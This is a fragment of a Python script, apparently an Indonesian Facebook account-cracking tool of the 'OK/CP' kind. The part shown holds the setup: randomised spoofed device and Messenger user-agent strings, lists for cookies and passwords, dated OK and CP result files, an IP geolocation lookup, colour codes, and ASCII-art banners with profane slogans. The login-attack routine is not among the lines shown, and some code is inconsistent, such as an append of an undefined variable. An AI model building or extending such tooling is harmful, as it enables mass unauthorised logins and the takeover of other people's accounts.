"G965U1", "G965N", "G9650", "J321AZ", "J326AZ", "J336AZ", "T116", "T116NU", "T116NY", "T116NQ", "T2519", "G318HZ", "T255S", "W2016", "W2018", "W2019", "W2021", "W2022", "G600S", "E426S", "G3812", "G3812B", "G3818", "G388F", "G389F", "G390F", "G398FN"]))
	 iphone = random.choice(['18_0','17_0','17.0','17_4','16_0','16_1_1','16_4_1','15_0','15_1','15_2_1','15_4','14_3','14_2','14_5_1','14_7_1','14_8_1','14_8','14.6','13_0','13_1_3','13_2_3','13_1','12_5_5','12_0','12_0_1','12_1','12_1_1','12_3','12_4','11_0','11_0_1','11_0_2','11_0_3','11_1','11_1_1','11_1_2','11_2','10_0','10_0_1','10_0_2','9_0','9_1','9.3','9_0_1','9_0_2','9_2_1','9_2','8_3','8_0','8_1','8_0_1','8_0_2','8_1_1','8_1_2','8_1_3','7_0','7_1'])
	 iphone1 = random.choice(["605.1.15","602.1.50","605.1.10","604.1.50","602.2.14","602.3.12","602.4.6","603.1.30","603.2.4","603.3.8","601.1.46"])
	 iphone2 = random.choice(["7B367","15E148","11A465","8A293","8B117","19G82","15E148","18F72","20G75"])
	 heytab = (f"HeyTapBrowser/{str(rr(2,40))}.{str(rr(0,10))}.{str(rr(0,99))}.{str(rr(0,9))}")
	 android = (f"{str(rr(6,13))}")
	 chrome = (f"{str(rr(76,117))}.0.{str(rr(0,5999))}.{str(rr(0,299))}")
	 k1 = (f"{str(rr(10,12))}")
	 k2 = (f"{str(rr(110,117))}.0.{str(rr(5000,5999))}.{str(rr(0,299))}")
	 fbav = (f"{str(rr(100,900))}.0.0.{str(rr(10,999))}.{str(rr(10,90))}")
	 ua_K = f"Dalvik/2.1.0 (Linux; U; Android {android}; {modelnya} Build/{c}.{d}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{k2} Mobile Safari/537.36"
	 ua_samsung = f"Mozilla/5.0 (Linux; Android {android}; SM-{samsung_sm} Build/{kombinasi_build}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Mobile Safari/537.36 {heytab}"
	 ua_campur = f"Mozilla/5.0 (Linux; Android {android}; {modelnya} Build/{kombinasi_build}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Mobile Safari/537.36 {heytab}"
	 ua_dalvik = f"Dalvik/2.1.0 (Linux; U; Android {k1}; CPH2477 Build/{kombinasi_build}) [FBAN/Orca-Android;FBAV/{fbav};FBPN/com.facebook.orca;FBLC/ms_MV;FBBV/597608774;FBCR/MY MAXIS;FBMF/OPPO;FBBD/OPPO;FBDV/CPH2477;FBSV/12;FBCA/arm63-v8a:null;FBDM/"+"{density=2.0,width=720,height=1460};FB_FW/1;] FBBK/1"
	 ua_iphone = f'Mozilla/5.0 (iPhone; CPU iPhone OS {iphone} like Mac OS X) AppleWebKit/{iphone1} (KHTML, like Gecko) CriOS/{chrome} Mobile Mobile/{iphone2} Safari/60{h}.1'
	 ua_dalvik1 = f"Dalvik/2.1.0 (Linux; U; Android {android}; {b} Build/{c}.{d})"
	 uakuh = str(rc([ua_K,ua_samsung,ua_iphone,ua_dalvik1,ua_dalvik,ua_samsung]))
	 ugen.append(uaku2)
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ PEWARNA ]--------------#
mer = '\033[1;31m'
kun = '\033[1;33m'
hijo = '\033[1;32m' 
biru = '\033[1;34m'
ung = '\033[1;35m'
puti = '\033[1;37m'
bira = '\033[1;36m'
xxx = '\33[m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m'  # DEFAULT
m = '\x1b[1;91m'  # RED +
k = '\033[93m'  # KUNING +
h = '\x1b[1;92m'  # HIJAU +
hh = '\033[32m'  # HIJAU -
u = '\033[95m'  # UNGU
kk = '\033[33m'  # KUNING -
b = '\33[1;96m'  # BIRU -
p = '\x1b[0;34m'  # BIRU +
# Warna
H = ('\x1b[1;90m')
M = ('\x1b[1;91m')
H = ('\x1b[1;92m')
K = ('\x1b[1;93m')
T = ('\x1b[1;94m')
U = ('\x1b[1;95m')
B = ('\x1b[1;96m')
P = ('\x1b[1;97m')
A = "\x1b[38;5;248m"
J = "\x1b[38;5;208m"
Z = "\x1b[0;90m"
asu = random.choice([m, k, h, u, b])
# ------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = "\033[1;30m"
#WARNA PRINT IMPORT RICH#
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
U2 = "[#bf00ff]" #UNGU
try:
	file_color = open("data/theme_color","r").read()
	color_text = file_color.split("|")[0]
	color_panel = file_color.split("|")[1]
except:
	color_text = "[#bf00ff]"
	color_logo = "[#00C8FF]" 
	colorbapa = random.choice([H2,K2,M2,B2,P2]) 
	color_panel = "#bf00ff"
	
	asu = random.choice([m,k,h,u,b])
try:cek_data = requests.get("http://ip-api.com/json/").json()
except:cek_data = {'-'}
try:asal_kota = cek_data["city"]
except:asal_kota = {'-'}
try:asal_reg = cek_data["region"]
except:asal_reg = cek_data['-']
try:times = cek_data["timezone"]
except:times = cek_data['-']
try:city = cek_data["city"]
except:city = cek_data['-']
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def clear():
    os.system('clear')
def back():
    tam()
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.05)
def loading():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.05)
        sys.stdout.write(f"\r>> {H}Loading...{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
        time.sleep(0.05)
        #------------------[ LOGO-LAKNAT ]-----------------#
def nasa():
	cetak(f"""{color_text}  \n         \r
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣤⣄⣀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣄⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡔
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⣿⣍⣿⣿⣿⣿⣦⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡟⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡻⣿⣿⣿⣿⣛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⠟
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠛⠛⠿⠿⣿⣿⣻⣷⣿⣿⣿⣿⣿⣿⣭⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⣿⣿⠋
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⣠⣶⣶⣿⣷⣶⣶⣤⣉⡙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿⠟⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⣼⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣶⣤⡉⠻⢿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⣠⣴⣿⣿⣿⣿⡿⠃
⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣿⣿⣿⣷⡟⢿⣯⣠⣿⣿⣿⣿⣿⣿⣷⣄⡙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋
⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋
⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧
⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆
⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀
⠀⠀⠀⠀⣸⣿⣿⣿⣿⡿⠿⠿⠿⠿⠿⣿⣿⣿⡿⠿⠿⠿⢧⠈⢿⣿⣿⣿⡿⠿⠿⠿⠿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠷⠄⠙⠿⣿⡿⢿⣿⣿⣿⣿⣿⢿⣿⣿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠀⠀⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠈⢿⣿⣿⡆⠀⢠⣿⣧⠘⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⡟⠉⠀⠀⠀⣀⣀⡀⠀⠀⢾⣿⣿⣿⣿⣿⡾⠛⠁⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠈⢻⣿⡇⠀⢸⣿⣿⣧⠘⢿⣿⡟⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⠀⠀⠀⠀⠸⢿⣿⣿⣄⠢⣾⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⡄
⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⡇⠀⢀⠀⠀⠀⠀⠀⠻⡇⠀⢸⣿⣿⣿⣧⣼⣿⠃⠀⣸⡄⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠉⢛⣆⠙⣿⣿⣿⣿⡟⠀⢠⣇⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⡇⠀⢸⣧⠀⠀⠀⠀⠀⠁⠀⢸⣿⣿⣿⣿⣿⡏⠀⠠⢿⣷⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣷⣤⣀⠀⠀⣀⣴⡾⠛⠁⠀⠘⣿⣿⣿⠁⠀⣾⣿⡆⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⡇
⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⡇⠀⢸⣿⣧⡀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⠁⠀⠀⢀⣀⣀⠀⠀⠀⠀⠀⢹⣿⣿⣿⠿⣿⣿⣿⣿⣿⣅⠀⠀⠀⠀⢠⠘⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⠇
⠀⠀⠀⠀⣿⣿⣿⣿⣿⡿⠃⠀⠸⣿⣿⣷⡀⠀⠀⠀⠀⠘⢿⣿⣿⣿⠇⠀⠰⣦⠈⢻⣿⠆⠀⠀⠀⠀⠀⢻⣿⣿⣶⠿⠋⠛⠛⠛⠉⠀⠀⠀⣠⣾⣧⠘⠀⠀⣾⣿⣿⣿⡧⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿
⠀⠀⠀⠀⢻⣿⣿⣿⣿⣶⣶⣶⣶⣾⣿⣿⣿⣦⣤⣤⣤⣤⣼⣿⣿⡶⢲⣶⣶⣿⣷⡄⠑⢶⣶⣶⣶⣶⣶⣶⣿⣿⣁⣴⣦⣤⣤⣠⣤⣤⣶⣿⣿⣿⣯⣄⢠⣤⣼⣿⣿⣿⣥⣤⣤⣤⣤⣤⣤⣼⣿⣿⡏
⠀⣀⠤⠒⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⢿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃
⠉⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠋⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⢸⣿⣿⣿⢻⣿⣿⣋⢘⣿⣿⣿⣿⣿⡟
⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠈⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⣿⢿⠘⣿⣿⣿⣿⣿⣿⣿⣾⢻⣿⣿⣿⡿
⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⢀⣿⣿⣿⣿⣿⣿⣶⣿⣿⣿⣿⡿⠁
⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣷⣾⣿⣿⠷⣿⣿⣿⣿⣿⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⣿⠏⢸⣿⣿⣿⣻⢿⣿⣿⣿⣿⣿⡿⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣏⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣛⣿⣿⣯⣛⡻⠿⠿⣿⣿⡿⠿⢋⣴⣿⣿⣿⣿⣅⢨⣯⣽⣿⣿⡟⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⣻⣿⣿⣿⣿⣿⣿⠟⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠔⠁⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣧⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠚⠁⠀⠀⠀⠀⠀⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠉⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠛⠛⠛⠛⠛⠛⠛⠛⠛⠉⠉⠉
             """)
def nasa1():
         cetak(f"[blue]                   NGOTAK ANJ*** BABI*")             
             #------------------[ LOGO-LAKNAT ]-----------------#
def bulan():
	cetak(f"""{color_text}  \n         \r
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⡴⢶⠶⣦⣤⣤⣄⣀⣀⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⠶⠚⠛⠉⠉⠁⠁⠉⠀⠀⣀⣀⣠⣬⣭⣭⣿⣷
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠶⠋⠁⠀⠀⠀⠀⠀⢀⣀⡤⠶⠚⠋⠉⠁⠀⣀⣀⣀⣤⣄⣀⡀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⡶⠋⠀⠀⠀⠀⠀⠀⠀⢰⡾⠋⠁⢀⣴⡖⠫⠍⠉⠉⠉⠁⠀⠀⠀⠀⠉⠒⠦⣄⡀
⠀⠀⠀⠀⠀⠀⣠⠞⠁⠀⠀⠀⠀⠀⠀⢰⣐⣯⠞⣡⣴⡿⠙⠅⠠⠤⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢦⣄
⠀⠀⠀⢀⡴⢞⡉⠀⠀⠀⠀⠀⠀⠀⣰⠟⢉⣤⠞⠋⣖⡑⠒⣀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⢆
⠀⠀⠀⣼⠡⠏⠀⠀⠀⠀⠀⠀⢀⡼⠃⢠⡾⢿⢇⢬⣭⣻⡀⢯⡻⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⣄⠈⢧⡀
⠀⠀⣰⠏⠁⠀⠀⠀⠀⠀⠀⠀⣾⠁⢰⣯⢧⠿⣿⣿⠟⣽⣦⣤⣠⠀⢚⡻⠂⡁⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠰⣆⡀⠈⠱⡄⠳⡄
⠀⢠⡏⠀⠠⢂⡐⠀⠀⠀⠀⣸⠃⢀⣾⣯⡿⣂⣴⣴⣠⠈⠉⠽⢈⠠⠃⢨⡁⣀⡄⠐⠒⠲⣶⡄⠀⠀⠀⠀⠀⠈⠈⠀⠀⠀⠀⠹⣄
⠀⣾⠀⢠⠁⣴⣿⢀⠀⠀⠀⣿⠀⣸⣿⣇⡾⢛⣾⣧⠛⣲⣶⣿⣡⠠⣈⣿⠸⣟⠀⠀⠀⠖⣹⡟⠀⠀⠀⡀⠂⢠⡀⠀⠀⠀⠀⠀⢹
⢀⡇⠀⠈⠸⣿⡏⡞⠀⠀⢰⡇⠀⣿⣏⣁⠀⠈⣾⡿⠰⣿⡿⣿⣤⣤⡀⣁⢀⠙⢤⣀⡀⠨⣺⠟⢀⡀⠀⠀⠀⠼⠁⠀⠀⠀⠰⠆⢸⡀
⢸⡇⠀⠸⣀⣋⠔⠁⠀⠀⢸⠃⢰⣯⣿⡿⣆⣈⣽⠆⣾⡼⣽⠋⠂⠎⠿⢮⣷⣡⠐⠐⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇
⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⢸⣿⢿⣟⣲⣷⣜⠿⢿⣿⣇⠀⠀⠀⠀⢹⣿⠁⠰⠠⠄⡀⢀⠀⠀⠈⠀⢱⣦⠀⠀⠀⠀⠀⢀⡀⢰⠇
⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠈⣿⠘⡣⢭⣿⣿⡴⣿⣽⣯⠴⠷⣿⣿⢿⣗⣠⣤⣀⣄⣈⠁⠀⠈⠀⠀⠀⠩⠙⠀⠀⠀⠈⠁⡞⣸
⢸⡀⠀⠀⠀⠀⠀⠀⠀⠀⢻⠀⠀⢿⢸⡏⣭⣿⣻⠺⣦⠉⣛⣰⣼⠻⠛⠁⠀⠋⠉⡁⠻⢿⣷⣄⠀⠀⠀⠀⠈⠀⠀⠀⠖⠀⠀⠁⣸
⢸⠓⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⠀⠈⢷⣃⢨⡍⢉⣻⣶⣴⣾⣿⡞⠐⣷⠀⠀⠀⠀⠁⠀⢸⣿⣇⡀⢀⢀⠀⠀⠀⠀⠀⠈⠒⠂⣼⠃
⢸⠈⣆⠄⠀⠀⠀⠀⠀⠀⠀⠉⣿⣆⠀⠻⣏⣗⣘⣿⣿⢿⣿⠇⠁⢀⠹⣇⠀⠀⠀⠀⠀⢈⣿⡿⡻⠃⠀⠐⠀⢀⡆⠀⠀⢀⡔⠋
⠘⢧⠹⠀⡀⠀⠀⠀⠀⠀⠀⠀⠙⢾⣧⠀⠙⣯⣻⣟⠟⢿⢈⠛⣦⡠⡁⠘⣦⣀⣀⡠⠊⠀⠀⠐⠁⠀⠀⠀⠉⠁⠀⠀⣠⠏
⠀⠈⠳⣴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠑⢿⡀⠀⠘⢿⣭⣶⣾⡀⢍⡙⠳⣏⢦⡺⠿⠍⠀⠀⠀⠀⠐⠆⠀⠀⠐⠀⠀⣴⠞⠁
⠀⠀⠀⠹⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣄⠀⠉⠛⠿⣿⣶⣤⠄⡈⠀⠀⠰⠶⠶⢤⣖⠂⠀⠀⠀⢀⣠⠞⠋⠁
⠀⠀⠀⠀⠘⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠶⣤⣤⣀⠈⠙⠶⠶⢥⣤⣦⣀⣀⣀⣹⠴⠶⠿⠞⠉⠀⠀⢀⣠⢶⡿
⠀⠀⠀⠀⠀⠀⠙⢦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠿⣻⣤⣤⣄⣀⣀⠀⠀⠉⠁⠀⠀⠀⢀⣀⣤⠴⠞⠋⣡⠟⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠛⠛⠛⠛⠛⠛⠉⠁⠀⣀⡴⠛⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⡴⠞⠉
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠶⢤⣄⣀⡀⠀⣀⢄⣀⣀⣀⠀⠀⣀⣀⣠⡤⠶⠚⠋⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠙⠒⠶⠿⠶⠞⠋⠉⠁
             """)
def bulan1():            
             cetak(f"[blue]                   MIKIR ANJ*** ")
      
      #------------------[ LOGO-LAKNAT ]-----------------#
def bintang():
	cetak(f"""{color_text}  \n         \r
